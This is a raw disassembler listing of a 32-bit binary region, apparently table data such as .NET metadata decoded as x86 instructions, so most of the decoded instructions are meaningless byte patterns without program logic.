  406343:	00 0a                	add    %cl,(%edx)
  406345:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406349:	00 00                	add    %al,(%eax)
  40634b:	00 96 00 19 1a 0a    	add    %dl,0xa1a1900(%esi)
  406351:	00 0b                	add    %cl,(%ebx)
  406353:	00 1d 21 00 00 00    	add    %bl,0x21
  406359:	00 91 00 63 07 84    	add    %dl,-0x7bf89d00(%ecx)
  40635f:	00 0b                	add    %cl,(%ebx)
  406361:	00 28                	add    %ch,(%eax)
  406363:	21 00                	and    %eax,(%eax)
  406365:	00 00                	add    %al,(%eax)
  406367:	00 91 00 8d 08 89    	add    %dl,-0x76f77300(%ecx)
  40636d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406370:	b8 2c 00 00 00       	mov    $0x2c,%eax
  406375:	00 96 00 48 19 0a    	add    %dl,0xa194800(%esi)
  40637b:	00 10                	add    %dl,(%eax)
  40637d:	00 40 2d             	add    %al,0x2d(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	00 00                	add    %al,(%eax)
  406384:	96                   	xchg   %eax,%esi
  406385:	00 a3 02 94 00 10    	add    %ah,0x10009402(%ebx)
  40638b:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  40638e:	00 00                	add    %al,(%eax)
  406390:	00 00                	add    %al,(%eax)
  406392:	96                   	xchg   %eax,%esi
  406393:	00 c4                	add    %al,%ah
  406395:	04 58                	add    $0x58,%al
  406397:	00 11                	add    %dl,(%ecx)
  406399:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  40639d:	00 00                	add    %al,(%eax)
  40639f:	00 96 00 81 19 9a    	add    %dl,-0x65e67f00(%esi)
  4063a5:	00 12                	add    %dl,(%edx)
  4063a7:	00 c8                	add    %cl,%al
  4063a9:	30 00                	xor    %al,(%eax)
  4063ab:	00 00                	add    %al,(%eax)
  4063ad:	00 91 00 f8 0c 9a    	add    %dl,-0x65f30800(%ecx)
  4063b3:	00 13                	add    %dl,(%ebx)
  4063b5:	00 35 21 00 00 00    	add    %dh,0x21
  4063bb:	00 91 18 ff 14 0a    	add    %dl,0xa14ff18(%ecx)
  4063c1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063c4:	10 31                	adc    %dh,(%ecx)
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	96                   	xchg   %eax,%esi
  4063cb:	00 05 0f 0a 00 14    	add    %al,0x14000a0f
  4063d1:	00 78 20             	add    %bh,0x20(%eax)
  4063d4:	00 00                	add    %al,(%eax)
  4063d6:	00 00                	add    %al,(%eax)
  4063d8:	86 18                	xchg   %bl,(%eax)
  4063da:	f9                   	stc
  4063db:	14 0e                	adc    $0xe,%al
  4063dd:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e0:	41                   	inc    %ecx
  4063e1:	21 00                	and    %eax,(%eax)
  4063e3:	00 00                	add    %al,(%eax)
  4063e5:	00 96 00 37 17 0a    	add    %dl,0xa173700(%esi)
  4063eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ee:	f8                   	clc
  4063ef:	33 00                	xor    (%eax),%eax
  4063f1:	00 00                	add    %al,(%eax)
  4063f3:	00 91 00 54 0e 1d    	add    %dl,0x1d0e5400(%ecx)
  4063f9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063fc:	50                   	push   %eax
  4063fd:	34 00                	xor    $0x0,%al
  4063ff:	00 00                	add    %al,(%eax)
  406401:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  406407:	00 14 00             	add    %dl,(%eax,%eax,1)
  40640a:	a0 34 00 00 00       	mov    0x34,%al
  40640f:	00 91 00 43 14 1d    	add    %dl,0x1d144300(%ecx)
  406415:	00 14 00             	add    %dl,(%eax,%eax,1)
  406418:	dc 35 00 00 00 00    	fdivl  0x0
  40641e:	91                   	xchg   %eax,%ecx
  40641f:	00 df                	add    %bl,%bh
  406421:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  406427:	36 00 00             	add    %al,%ss:(%eax)
  40642a:	00 00                	add    %al,(%eax)
  40642c:	91                   	xchg   %eax,%ecx
  40642d:	00 85 05 1d 00 14    	add    %al,0x14001d05(%ebp)
  406433:	00 78 20             	add    %bh,0x20(%eax)
  406436:	00 00                	add    %al,(%eax)
  406438:	00 00                	add    %al,(%eax)
  40643a:	86 18                	xchg   %bl,(%eax)
  40643c:	f9                   	stc
  40643d:	14 0e                	adc    $0xe,%al
  40643f:	00 14 00             	add    %dl,(%eax,%eax,1)
  406442:	6c                   	insb   (%dx),%es:(%edi)
  406443:	36 00 00             	add    %al,%ss:(%eax)
  406446:	00 00                	add    %al,(%eax)
  406448:	96                   	xchg   %eax,%esi
  406449:	00 ef                	add    %ch,%bh
  40644b:	01 c3                	add    %eax,%ebx
  40644d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406450:	f0 36 00 00          	lock add %al,%ss:(%eax)
  406454:	00 00                	add    %al,(%eax)
  406456:	96                   	xchg   %eax,%esi
  406457:	00 27                	add    %ah,(%edi)
  406459:	0d c7 00 14 00       	or     $0x1400c7,%eax
  40645e:	5c                   	pop    %esp
  40645f:	37                   	aaa
  406460:	00 00                	add    %al,(%eax)
  406462:	00 00                	add    %al,(%eax)
  406464:	96                   	xchg   %eax,%esi
  406465:	00 0c 12             	add    %cl,(%edx,%edx,1)
  406468:	53                   	push   %ebx
  406469:	00 15 00 7b 21 00    	add    %dl,0x217b00
  40646f:	00 00                	add    %al,(%eax)
  406471:	00 96 00 cf 10 1d    	add    %dl,0x1d10cf00(%esi)
  406477:	00 15 00 18 39 00    	add    %dl,0x391800
  40647d:	00 00                	add    %al,(%eax)
  40647f:	00 96 00 df 19 0a    	add    %dl,0xa19df00(%esi)
  406485:	00 15 00 90 39 00    	add    %dl,0x399000
  40648b:	00 00                	add    %al,(%eax)
  40648d:	00 96 00 ab 18 c3    	add    %dl,-0x3ce75500(%esi)
  406493:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406499:	00 00                	add    %al,(%eax)
  40649b:	00 96 00 7b 13 d5    	add    %dl,-0x2aec8500(%esi)
  4064a1:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  4064a7:	00 00                	add    %al,(%eax)
  4064a9:	00 96 00 71 12 0a    	add    %dl,0xa127100(%esi)
  4064af:	00 16                	add    %dl,(%esi)
  4064b1:	00 f8                	add    %bh,%al
  4064b3:	3a 00                	cmp    (%eax),%al
  4064b5:	00 00                	add    %al,(%eax)
  4064b7:	00 96 00 8d 06 c3    	add    %dl,-0x3cf97300(%esi)
  4064bd:	00 16                	add    %dl,(%esi)
  4064bf:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064c3:	00 00                	add    %al,(%eax)
  4064c5:	00 96 00 34 1c 1d    	add    %dl,0x1d1c3400(%esi)
  4064cb:	00 16                	add    %dl,(%esi)
  4064cd:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064d3:	00 96 00 29 1c 0a    	add    %dl,0xa1c2900(%esi)
  4064d9:	00 16                	add    %dl,(%esi)
  4064db:	00 00                	add    %al,(%eax)
  4064dd:	00 00                	add    %al,(%eax)
  4064df:	00 80 00 96 20 fc    	add    %al,-0x3df6a00(%eax)
  4064e5:	1b e0                	sbb    %eax,%esp
  4064e7:	00 16                	add    %dl,(%esi)
  4064e9:	00 00                	add    %al,(%eax)
  4064eb:	00 00                	add    %al,(%eax)
  4064ed:	00 80 00 96 20 e3    	add    %al,-0x1cdf6a00(%eax)
  4064f3:	1b e4                	sbb    %esp,%esp
  4064f5:	00 16                	add    %dl,(%esi)
  4064f7:	00 00                	add    %al,(%eax)
  4064f9:	00 00                	add    %al,(%eax)
  4064fb:	00 80 00 96 20 e6    	add    %al,-0x19df6a00(%eax)
  406501:	05 ec 00 19 00       	add    $0x1900ec,%eax
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	80 00 96             	addb   $0x96,(%eax)
  40650d:	20 f9                	and    %bh,%cl
  40650f:	1a f1                	sbb    %cl,%dh
  406511:	00 1a                	add    %bl,(%edx)
  406513:	00 00                	add    %al,(%eax)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 80 00 96 20 ba    	add    %al,-0x45df6a00(%eax)
  40651d:	08 f8                	or     %bh,%al
  40651f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406522:	00 00                	add    %al,(%eax)
  406524:	00 00                	add    %al,(%eax)
  406526:	80 00 96             	addb   $0x96,(%eax)
  406529:	20 76 0e             	and    %dh,0xe(%esi)
  40652c:	ff 00                	incl   (%eax)
  40652e:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  406533:	00 00                	add    %al,(%eax)
  406535:	00 96 00 bf 0b 1c    	add    %dl,0x1c0bbf00(%esi)
  40653b:	01 20                	add    %esp,(%eax)
  40653d:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406541:	00 00                	add    %al,(%eax)
  406543:	00 96 00 61 19 0a    	add    %dl,0xa196100(%esi)
  406549:	00 22                	add    %ah,(%edx)
  40654b:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  406552:	96                   	xchg   %eax,%esi
  406553:	00 e7                	add    %ah,%bh
  406555:	19 0a                	sbb    %ecx,(%edx)
  406557:	00 22                	add    %ah,(%edx)
  406559:	00 f4                	add    %dh,%ah
  40655b:	3b 00                	cmp    (%eax),%eax
  40655d:	00 00                	add    %al,(%eax)
  40655f:	00 96 00 b8 0a 23    	add    %dl,0x230ab800(%esi)
  406565:	01 22                	add    %esp,(%edx)
  406567:	00 60 3c             	add    %ah,0x3c(%eax)
  40656a:	00 00                	add    %al,(%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	96                   	xchg   %eax,%esi
  40656f:	00 af 0a 2a 01 24    	add    %ch,0x24012a0a(%edi)
  406575:	00 cc                	add    %cl,%ah
  406577:	3c 00                	cmp    $0x0,%al
  406579:	00 00                	add    %al,(%eax)
  40657b:	00 96 00 98 0a 84    	add    %dl,-0x7bf56800(%esi)
  406581:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  406587:	00 00                	add    %al,(%eax)
  406589:	00 96 00 aa 1c 1d    	add    %dl,0x1d1caa00(%esi)
  40658f:	00 26                	add    %ah,(%esi)
  406591:	00 cd                	add    %cl,%ch
  406593:	21 00                	and    %eax,(%eax)
  406595:	00 00                	add    %al,(%eax)
  406597:	00 91 18 ff 14 0a    	add    %dl,0xa14ff18(%ecx)
  40659d:	00 26                	add    %ah,(%esi)
  40659f:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  4065a5:	00 96 00 0c 03 9a    	add    %dl,-0x65fcf400(%esi)
  4065ab:	00 26                	add    %ah,(%esi)
  4065ad:	00 dc                	add    %bl,%ah
  4065af:	3f                   	aas
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	00 00                	add    %al,(%eax)
  4065b4:	91                   	xchg   %eax,%ecx
  4065b5:	00 95 05 38 01 27    	add    %dl,0x27013805(%ebp)
  4065bb:	00 e3                	add    %ah,%bl
  4065bd:	21 00                	and    %eax,(%eax)
  4065bf:	00 00                	add    %al,(%eax)
  4065c1:	00 91 00 62 03 0a    	add    %dl,0xa036200(%ecx)
  4065c7:	00 28                	add    %ch,(%eax)
  4065c9:	00 13                	add    %dl,(%ebx)
  4065cb:	22 00                	and    (%eax),%al
  4065cd:	00 00                	add    %al,(%eax)
  4065cf:	00 96 00 95 14 3e    	add    %dl,0x3e149500(%esi)
  4065d5:	01 28                	add    %ebp,(%eax)
  4065d7:	00 4a 22             	add    %cl,0x22(%edx)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	91                   	xchg   %eax,%ecx
  4065df:	18 ff                	sbb    %bh,%bh
  4065e1:	14 0a                	adc    $0xa,%al
  4065e3:	00 29                	add    %ch,(%ecx)
  4065e5:	00 fc                	add    %bh,%ah
  4065e7:	40                   	inc    %eax
  4065e8:	00 00                	add    %al,(%eax)
  4065ea:	00 00                	add    %al,(%eax)
  4065ec:	86 18                	xchg   %bl,(%eax)
  4065ee:	f9                   	stc
  4065ef:	14 6b                	adc    $0x6b,%al
  4065f1:	01 29                	add    %ebp,(%ecx)
  4065f3:	00 56 22             	add    %dl,0x22(%esi)
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	00 00                	add    %al,(%eax)
  4065fa:	86 00                	xchg   %al,(%eax)
  4065fc:	70 1b                	jo     0x406619
  4065fe:	70 01                	jo     0x406601
  406600:	2a 00                	sub    (%eax),%al
  406602:	74 41                	je     0x406645
  406604:	00 00                	add    %al,(%eax)
  406606:	00 00                	add    %al,(%eax)
  406608:	86 00                	xchg   %al,(%eax)
  40660a:	70 1b                	jo     0x406627
  40660c:	75 01                	jne    0x40660f
  40660e:	2b 00                	sub    (%eax),%eax
  406610:	6e                   	outsb  %ds:(%esi),(%dx)
  406611:	22 00                	and    (%eax),%al
  406613:	00 00                	add    %al,(%eax)
  406615:	00 86 00 68 1b 70    	add    %al,0x701b6800(%esi)
  40661b:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  40661e:	cc                   	int3
  40661f:	42                   	inc    %edx
  406620:	00 00                	add    %al,(%eax)
  406622:	00 00                	add    %al,(%eax)
  406624:	86 00                	xchg   %al,(%eax)
  406626:	68 1b 75 01 2d       	push   $0x2d01751b
  40662b:	00 8c 44 00 00 48 00 	add    %cl,0x480000(%esp,%eax,2)
  406632:	81 00 db 0e 7c 01    	addl   $0x17c0edb,(%eax)
  406638:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  40663f:	00 91 18 ff 14 0a    	add    %dl,0xa14ff18(%ecx)
  406645:	00 30                	add    %dh,(%eax)
  406647:	00 bc 44 00 00 00 00 	add    %bh,0x0(%esp,%eax,2)
  40664e:	96                   	xchg   %eax,%esi
  40664f:	00 11                	add    %dl,(%ecx)
  406651:	0d c7 00 30 00       	or     $0x3000c7,%eax
  406656:	48                   	dec    %eax
  406657:	45                   	inc    %ebp
  406658:	00 00                	add    %al,(%eax)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	96                   	xchg   %eax,%esi
  40665d:	00 11                	add    %dl,(%ecx)
  40665f:	0d 84 01 31 00       	or     $0x310184,%eax
  406664:	9f                   	lahf
  406665:	22 00                	and    (%eax),%al
  406667:	00 00                	add    %al,(%eax)
  406669:	00 96 00 36 16 2a    	add    %dl,0x2a163600(%esi)
  40666f:	01 32                	add    %esi,(%edx)
  406671:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406678:	96                   	xchg   %eax,%esi
  406679:	00 a7 0c 93 01 33    	add    %ah,0x3301930c(%edi)
  40667f:	00 88 45 00 00 00    	add    %cl,0x45(%eax)
  406685:	00 96 00 81 0c 93    	add    %dl,-0x6cf37f00(%esi)
  40668b:	01 34 00             	add    %esi,(%eax,%eax,1)
  40668e:	d0 45 00             	rolb   $1,0x0(%ebp)
  406691:	00 00                	add    %al,(%eax)
  406693:	00 96 00 b1 0c 93    	add    %dl,-0x6cf34f00(%esi)
  406699:	01 35 00 18 46 00    	add    %esi,0x461800
  40669f:	00 00                	add    %al,(%eax)
  4066a1:	00 96 00 7d 16 84    	add    %dl,-0x7be98300(%esi)
  4066a7:	01 36                	add    %esi,(%esi)
  4066a9:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066af:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066b5:	01 37                	add    %esi,(%edi)
  4066b7:	00 c6                	add    %al,%dh
  4066b9:	22 00                	and    (%eax),%al
  4066bb:	00 00                	add    %al,(%eax)
  4066bd:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066c3:	01 38                	add    %edi,(%eax)
  4066c5:	00 ea                	add    %ch,%dl
  4066c7:	22 00                	and    (%eax),%al
  4066c9:	00 00                	add    %al,(%eax)
  4066cb:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066d1:	01 39                	add    %edi,(%ecx)
  4066d3:	00 fe                	add    %bh,%dh
  4066d5:	22 00                	and    (%eax),%al
  4066d7:	00 00                	add    %al,(%eax)
  4066d9:	00 96 00 bd 05 ab    	add    %dl,-0x54fa4300(%esi)
  4066df:	01 3a                	add    %edi,(%edx)
  4066e1:	00 78 20             	add    %bh,0x20(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	86 18                	xchg   %bl,(%eax)
  4066ea:	f9                   	stc
  4066eb:	14 0e                	adc    $0xe,%al
  4066ed:	00 3b                	add    %bh,(%ebx)
  4066ef:	00 0b                	add    %cl,(%ebx)
  4066f1:	23 00                	and    (%eax),%eax
  4066f3:	00 00                	add    %al,(%eax)
  4066f5:	00 91 18 ff 14 0a    	add    %dl,0xa14ff18(%ecx)
  4066fb:	00 3b                	add    %bh,(%ebx)
  4066fd:	00 17                	add    %dl,(%edi)
  4066ff:	23 00                	and    (%eax),%eax
  406701:	00 00                	add    %al,(%eax)
  406703:	00 86 18 f9 14 b1    	add    %al,-0x4eeb06e8(%esi)
  406709:	01 3b                	add    %edi,(%ebx)
  40670b:	00 2d 23 00 00 00    	add    %ch,0x23
  406711:	00 e1                	add    %ah,%cl
  406713:	09 c3                	or     %eax,%ebx
  406715:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  40671b:	23 00                	and    (%eax),%eax
  40671d:	00 00                	add    %al,(%eax)
  40671f:	00 e1                	add    %ah,%cl
  406721:	01 af 1b bf 01 3c    	add    %ebp,0x3c01bf1b(%edi)
  406727:	00 63 23             	add    %ah,0x23(%ebx)
  40672a:	00 00                	add    %al,(%eax)
  40672c:	00 00                	add    %al,(%eax)
  40672e:	e1 01                	loope  0x406731
  406730:	9e                   	sahf
  406731:	19 0e                	sbb    %ecx,(%esi)
  406733:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406736:	6c                   	insb   (%dx),%es:(%edi)
  406737:	23 00                	and    (%eax),%eax
  406739:	00 00                	add    %al,(%eax)
  40673b:	00 86 18 f9 14 cb    	add    %al,-0x34eb06e8(%esi)
  406741:	01 3c 00             	add    %edi,(%eax,%eax,1)
  406744:	82 23 00             	andb   $0x0,(%ebx)
  406747:	00 00                	add    %al,(%eax)
  406749:	00 86 00 22 03 d7    	add    %al,-0x28fcde00(%esi)
  40674f:	01 3e                	add    %edi,(%esi)
  406751:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  406757:	00 86 00 22 03 dc    	add    %al,-0x23fcde00(%esi)
  40675d:	01 3e                	add    %edi,(%esi)
  40675f:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  406765:	00 86 00 22 03 e2    	add    %al,-0x1dfcde00(%esi)
  40676b:	01 3f                	add    %edi,(%edi)
  40676d:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  406773:	00 86 00 22 03 e8    	add    %al,-0x17fcde00(%esi)
  406779:	01 40 00             	add    %eax,0x0(%eax)
  40677c:	cb                   	lret
  40677d:	23 00                	and    (%eax),%eax
  40677f:	00 00                	add    %al,(%eax)
  406781:	00 86 08 c9 0f ee    	add    %al,-0x11f036f8(%esi)
  406787:	01 41 00             	add    %eax,0x0(%ecx)
  40678a:	d9 23                	fldenv (%ebx)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	00 00                	add    %al,(%eax)
  406790:	86 08                	xchg   %cl,(%eax)
  406792:	75 0d                	jne    0x4067a1
  406794:	f4                   	hlt
  406795:	01 42 00             	add    %eax,0x0(%edx)
  406798:	e6 23                	out    %al,$0x23
  40679a:	00 00                	add    %al,(%eax)
  40679c:	00 00                	add    %al,(%eax)
  40679e:	81 00 8c 07 6b 01    	addl   $0x16b078c,(%eax)
  4067a4:	42                   	inc    %edx
  4067a5:	00 50 46             	add    %dl,0x46(%eax)
  4067a8:	00 00                	add    %al,(%eax)
  4067aa:	00 00                	add    %al,(%eax)
  4067ac:	81 00 be 12 0e 00    	addl   $0xe12be,(%eax)
  4067b2:	43                   	inc    %ebx
  4067b3:	00 94 46 00 00 00 00 	add    %dl,0x0(%esi,%eax,2)
  4067ba:	81 00 1d 03 d7 01    	addl   $0x1d7031d,(%eax)
  4067c0:	43                   	inc    %ebx
  4067c1:	00 bc 46 00 00 00 00 	add    %bh,0x0(%esi,%eax,2)
  4067c8:	81 00 61 0b 0a 02    	addl   $0x20a0b61,(%eax)
  4067ce:	43                   	inc    %ebx
  4067cf:	00 38                	add    %bh,(%eax)
  4067d1:	47                   	inc    %edi
  4067d2:	00 00                	add    %al,(%eax)
  4067d4:	00 00                	add    %al,(%eax)
  4067d6:	86 00                	xchg   %al,(%eax)
  4067d8:	08 19                	or     %bl,(%ecx)
  4067da:	dc 01                	faddl  (%ecx)
  4067dc:	44                   	inc    %esp
  4067dd:	00 00                	add    %al,(%eax)
  4067df:	24 00                	and    $0x0,%al
  4067e1:	00 00                	add    %al,(%eax)
  4067e3:	00 81 00 9b 04 d7    	add    %al,-0x28fb6500(%ecx)
  4067e9:	01 45 00             	add    %eax,0x0(%ebp)
  4067ec:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067ef:	00 00                	add    %al,(%eax)
  4067f1:	00 81 00 ac 04 d7    	add    %al,-0x28fb5400(%ecx)
  4067f7:	01 45 00             	add    %eax,0x0(%ebp)
  4067fa:	42                   	inc    %edx
  4067fb:	24 00                	and    $0x0,%al
  4067fd:	00 00                	add    %al,(%eax)
  4067ff:	00 86 00 b1 04 d7    	add    %al,-0x28fb4f00(%esi)
  406805:	01 45 00             	add    %eax,0x0(%ebp)
  406808:	64 47                	fs inc %edi
  40680a:	00 00                	add    %al,(%eax)
  40680c:	00 00                	add    %al,(%eax)
  40680e:	81 00 68 12 0f 02    	addl   $0x20f1268,(%eax)
  406814:	45                   	inc    %ebp
  406815:	00 2c 48             	add    %ch,(%eax,%ecx,2)
  406818:	00 00                	add    %al,(%eax)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	81 00 46 1c 0f 02    	addl   $0x20f1c46,(%eax)
  406822:	46                   	inc    %esi
  406823:	00 4a 24             	add    %cl,0x24(%edx)
  406826:	00 00                	add    %al,(%eax)
  406828:	00 00                	add    %al,(%eax)
  40682a:	86 00                	xchg   %al,(%eax)
  40682c:	d2 13                	rclb   %cl,(%ebx)
  40682e:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  406833:	24 00                	and    $0x0,%al
  406835:	00 00                	add    %al,(%eax)
  406837:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  40683d:	02 48 00             	add    0x0(%eax),%cl
  406840:	e0 48                	loopne 0x40688a
  406842:	00 00                	add    %al,(%eax)
  406844:	00 00                	add    %al,(%eax)
  406846:	86 00                	xchg   %al,(%eax)
  406848:	b6 00                	mov    $0x0,%dh
  40684a:	1f                   	pop    %ds
  40684b:	02 49 00             	add    0x0(%ecx),%cl
  40684e:	88 49 00             	mov    %cl,0x0(%ecx)
  406851:	00 00                	add    %al,(%eax)
  406853:	00 86 00 c5 13 23    	add    %al,0x2313c500(%esi)
  406859:	02 49 00             	add    0x0(%ecx),%cl
  40685c:	30 4a 00             	xor    %cl,0x0(%edx)
  40685f:	00 00                	add    %al,(%eax)
  406861:	00 86 00 f2 18 27    	add    %al,0x2718f200(%esi)
  406867:	02 49 00             	add    0x0(%ecx),%cl
  40686a:	74 24                	je     0x406890
  40686c:	00 00                	add    %al,(%eax)
  40686e:	00 00                	add    %al,(%eax)
  406870:	86 00                	xchg   %al,(%eax)
  406872:	a2 16 2b 02 49       	mov    %al,0x49022b16
  406877:	00 c4                	add    %al,%ah
  406879:	4a                   	dec    %edx
  40687a:	00 00                	add    %al,(%eax)
  40687c:	00 00                	add    %al,(%eax)
  40687e:	86 00                	xchg   %al,(%eax)
  406880:	97                   	xchg   %eax,%edi
  406881:	16                   	push   %ss
  406882:	31 02                	xor    %eax,(%edx)
  406884:	4a                   	dec    %edx
  406885:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  40688b:	00 86 00 22 03 36    	add    %al,0x36032200(%esi)
  406891:	02 4a 00             	add    0x0(%edx),%cl
  406894:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  40689b:	00 22                	add    %ah,(%edx)
  40689d:	03 3c 02             	add    (%edx,%eax,1),%edi
  4068a0:	4c                   	dec    %esp
  4068a1:	00 74 4b 00          	add    %dh,0x0(%ebx,%ecx,2)
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	00 86 00 87 16 42    	add    %al,0x42168700(%esi)
  4068ad:	02 4e 00             	add    0x0(%esi),%cl
  4068b0:	cc                   	int3
  4068b1:	4b                   	dec    %ebx
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	86 00                	xchg   %al,(%eax)
  4068b8:	61                   	popa
  4068b9:	06                   	push   %es
  4068ba:	42                   	inc    %edx
  4068bb:	02 4f 00             	add    0x0(%edi),%cl
  4068be:	18 4c 00 00          	sbb    %cl,0x0(%eax,%eax,1)
  4068c2:	00 00                	add    %al,(%eax)
  4068c4:	86 00                	xchg   %al,(%eax)
  4068c6:	28 19                	sub    %bl,(%ecx)
  4068c8:	dc 01                	faddl  (%ecx)
  4068ca:	50                   	push   %eax
  4068cb:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068d1:	00 86 00 43 0f 0e    	add    %al,0xe0f4300(%esi)
  4068d7:	00 51 00             	add    %dl,0x0(%ecx)
  4068da:	c6                   	(bad)
  4068db:	24 00                	and    $0x0,%al
  4068dd:	00 00                	add    %al,(%eax)
  4068df:	00 86 00 9b 0c 6b    	add    %al,0x6b0c9b00(%esi)
  4068e5:	01 51 00             	add    %edx,0x0(%ecx)
  4068e8:	d6                   	salc
  4068e9:	24 00                	and    $0x0,%al
  4068eb:	00 00                	add    %al,(%eax)
  4068ed:	00 86 00 8f 0c 47    	add    %al,0x470c8f00(%esi)
  4068f3:	02 52 00             	add    0x0(%edx),%dl
  4068f6:	f4                   	hlt
  4068f7:	24 00                	and    $0x0,%al
  4068f9:	00 00                	add    %al,(%eax)
  4068fb:	00 86 00 73 10 4b    	add    %al,0x4b107300(%esi)
  406901:	02 52 00             	add    0x0(%edx),%dl
  406904:	09 25 00 00 00 00    	or     %esp,0x0
  40690a:	86 00                	xchg   %al,(%eax)
  40690c:	3a 06                	cmp    (%esi),%al
  40690e:	50                   	push   %eax
  40690f:	02 53 00             	add    0x0(%ebx),%dl
  406912:	1f                   	pop    %ds
  406913:	25 00 00 00 00       	and    $0x0,%eax
  406918:	86 00                	xchg   %al,(%eax)
  40691a:	fd                   	std
  40691b:	18 55 02             	sbb    %dl,0x2(%ebp)
  40691e:	54                   	push   %esp
  40691f:	00 d4                	add    %dl,%ah
  406921:	4c                   	dec    %esp
  406922:	00 00                	add    %al,(%eax)
  406924:	00 00                	add    %al,(%eax)
  406926:	86 00                	xchg   %al,(%eax)
  406928:	6d                   	insl   (%dx),%es:(%edi)
  406929:	16                   	push   %ss
  40692a:	2b 02                	sub    (%edx),%eax
  40692c:	55                   	push   %ebp
  40692d:	00 2c 4d 00 00 00 00 	add    %ch,0x0(,%ecx,2)
  406934:	86 00                	xchg   %al,(%eax)
  406936:	52                   	push   %edx
  406937:	06                   	push   %es
  406938:	6b 01 56             	imul   $0x56,(%ecx),%eax
  40693b:	00 50 4d             	add    %dl,0x4d(%eax)
  40693e:	00 00                	add    %al,(%eax)
  406940:	00 00                	add    %al,(%eax)
  406942:	86 00                	xchg   %al,(%eax)
  406944:	8b 0f                	mov    (%edi),%ecx
  406946:	0f 02 57 00          	lar    0x0(%edi),%edx
  40694a:	64 53                	fs push %ebx
  40694c:	00 00                	add    %al,(%eax)
  40694e:	00 00                	add    %al,(%eax)
  406950:	86 00                	xchg   %al,(%eax)
  406952:	29 16                	sub    %edx,(%esi)
  406954:	31 02                	xor    %eax,(%edx)
  406956:	58                   	pop    %eax
  406957:	00 d0                	add    %dl,%al
  406959:	53                   	push   %ebx
  40695a:	00 00                	add    %al,(%eax)
  40695c:	00 00                	add    %al,(%eax)
  40695e:	86 00                	xchg   %al,(%eax)
  406960:	5a                   	pop    %edx
  406961:	0f                   	(bad)
  406962:	0f 02 58 00          	lar    0x0(%eax),%ebx
  406966:	34 25                	xor    $0x25,%al
  406968:	00 00                	add    %al,(%eax)
  40696a:	00 00                	add    %al,(%eax)
  40696c:	86 08                	xchg   %cl,(%eax)
  40696e:	67 0c 47             	addr16 or $0x47,%al
  406971:	02 59 00             	add    0x0(%ecx),%bl
  406974:	3c 25                	cmp    $0x25,%al
  406976:	00 00                	add    %al,(%eax)
  406978:	00 00                	add    %al,(%eax)
  40697a:	86 08                	xchg   %cl,(%eax)
  40697c:	74 0c                	je     0x40698a
  40697e:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406981:	00 45 25             	add    %al,0x25(%ebp)
  406984:	00 00                	add    %al,(%eax)
  406986:	00 00                	add    %al,(%eax)
  406988:	86 08                	xchg   %cl,(%eax)
  40698a:	a9 13 23 02 5a       	test   $0x5a022313,%eax
  40698f:	00 4d 25             	add    %cl,0x25(%ebp)
  406992:	00 00                	add    %al,(%eax)
  406994:	00 00                	add    %al,(%eax)
  406996:	86 08                	xchg   %cl,(%eax)
  406998:	b7 13                	mov    $0x13,%bh
  40699a:	15 02 5a 00 56       	adc    $0x56005a02,%eax
  40699f:	25 00 00 00 00       	and    $0x0,%eax
  4069a4:	86 08                	xchg   %cl,(%eax)
  4069a6:	da 18                	ficompl (%eax)
  4069a8:	27                   	daa
